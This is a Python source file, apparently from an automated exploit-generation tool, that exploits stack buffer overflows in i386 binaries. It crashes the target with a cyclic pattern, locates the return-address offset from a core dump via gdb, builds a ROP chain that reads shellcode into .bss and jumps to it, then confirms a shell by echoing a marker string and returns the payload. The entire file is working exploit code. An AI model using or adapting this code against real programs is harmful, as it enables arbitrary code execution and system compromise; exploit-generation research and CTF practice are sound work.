import roputils
from resource import setrlimit, RLIMIT_CORE, RLIM_INFINITY
from pwn import *
from state import *
import os
#context.log_level = 'debug'

class quick_mode():
    @classmethod
    def getshell(self, binary):
        global receive
        #try:
        if 1:
            fpath = binary
            core_list = filter(lambda x:"core" in x, os.listdir('.'))
            if len(core_list) is not 0:
                os.popen('ulimit -c unlimited')
                for core in core_list:
                    os.unlink(core)
            p = process(binary)
            p.sendline(roputils.Pattern.create(2000))
            sleep(0.5)
            p.close()
            '''
            os.popen('ulimit -c unlimited')
            p = process(fpath)
            p.sendline(roputils.Pattern.create(2000))
            '''
            core_list = filter(lambda x: "core" in x, os.listdir('.'))
            core = core_list[0]
            p = roputils.Popen(['gdb', fpath, core, '--batch', '-ex', 'x/wx $sp'], stdin=PIPE, stdout=PIPE)
            data = p.stdout.readlines()
            retaddr = data[len(data)-1].split(':')[1].strip()
            index = roputils.Pattern.offset(retaddr)
            offset = int(index)
            r = roputils.ROP(fpath)
            target_elf = ELF(fpath)
            sc = roputils.Shellcode('i386')
            read_string = "\x65\x83\x3D\x0C\x00\x00\x00\x00\x75\x25\x53\x8B\x54\x24\x10\x8B\x4C\x24\x0C\x8B\x5C\x24\x08\xB8\x03\x00\x00\x00"
            read_offset = list(target_elf.search(read_string))[0]
            #print hex(read_offset)
            target_elf = ELF(fpath)
            buf_1 = r.retfill(offset)
            #print len(buf_1)
            addr_stage = r.section('.bss')
            #print 'addr_stage',hex(addr_stage)
            #print r.call(read_offset, 0, addr_stage, len(sc.exec_shell())),len(r.call(read_offset, 0, addr_stage, len(sc.exec_shell())))
            buf_1 += r.call(read_offset, 0, addr_stage, len(sc.exec_shell()))
            buf_1 += r.call(addr_stage)
            buf_2 = sc.exec_shell()
            #print 'shellcode ready' 
        #except:
        #    return -1
        #try:
        receive = str()
        for i in range(2):
            try:
                p = process(r.fpath)
                p.sendline(buf_1)
                #print 'quick_mode : buf_1 send'
                #print 'buf_1 : ',buf_1
                #print len(buf_1)
                p.recvn(1)
                p.sendline(buf_2)
                #print 'quick_mode : buf_2 send'
                #print 'quick send'
            #try:
                p.sendline('echo zxcv;')
                receive = p.recvuntil('zxcv\n')
                p.close()
                #print 'i:' + str(i) + 'p.close'
            #try:
                #print 'receive:',receive
            except:
                if i == 0:
                    p.close()
                    pass
                    #print 'i == 0,pass'
                else:
                    p.close()
                    #print 'i == 1,return -1'
                    return -1
            if 'zxcv' in receive:
                break
            if i == 0:
                buf_1 = 'a' + '\x00' + buf_1[2:]
                #print 'replace buf_1'
                #print len(buf_1)
            #p.close()
        #print 'return payload'
        return buf_1 + ',.,' + buf_2
        #except:
         #   print 'total return -1'
          #  return -1
